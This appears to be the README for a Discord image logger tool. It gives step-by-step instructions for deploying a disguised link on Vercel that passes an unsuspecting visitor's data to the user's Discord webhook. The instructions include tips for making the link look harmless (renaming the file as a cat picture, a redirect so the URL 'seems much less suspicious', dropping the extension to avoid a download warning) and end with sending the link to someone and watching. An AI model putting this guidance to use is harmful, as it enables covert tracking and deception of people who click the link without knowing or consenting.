# Discord-Image-Logger
-> how to get webhook URL
1: go to your server(recommended to be empty)
2: go to any channel go to edit channel(recommended you being the only one who have access to it)
2: go to integrations and click new webhook
4: click on the new one you make and copy the webhook
-> how to get image
go to google and get random pic and right click then open image in new tap and copy the link, stupid

IMPORTANT
you need the image link and the webhook url for the code go to main.py then paste the both the link and the URL between the " and replacing the -
it will look like this "webhook": "-", //  "image": "-",

#⚒️ Setup

1: Create a GitHub repository. I recommend it be private, so others can't see your webhook URL.

2: Make a folder named api, and place requirements.txt and main.py in (Rename it whatever, e.g. catpicture.py would make the URL your.site/api/catepicture)

3: (Optional) make a file in the main root (NOT IN API) named index.html, and put the code below in:<meta http-equiv="refresh" content="0;url=./api/main.py">
(You can replace main.py with whatever you made it!); The point of this step is so that you can just visit your.site and not your.site/api/main (The former seems much less suspicious) however note it may not preview on Discord if you do so. Still looking for a workaround for this.

4: Visit https://vercel.com and log in with GitHub.

5: Click add new to make a new project. Select the GitHub repository you made where it says Import GitHub Repository

6: Copy the domain for you. It should be something like project.vercel.app, unless you did step #3 you'll have to add api/main to it, so it will look more like project.vercel.app/api/main (Replace project.vercel.app with the domain it gave you, and main with whatever you named the file, WITHOUT THE .py, or else it will say potentially dangerous download), now send your link, have someone click Open Original/Open in Browser, and watch!
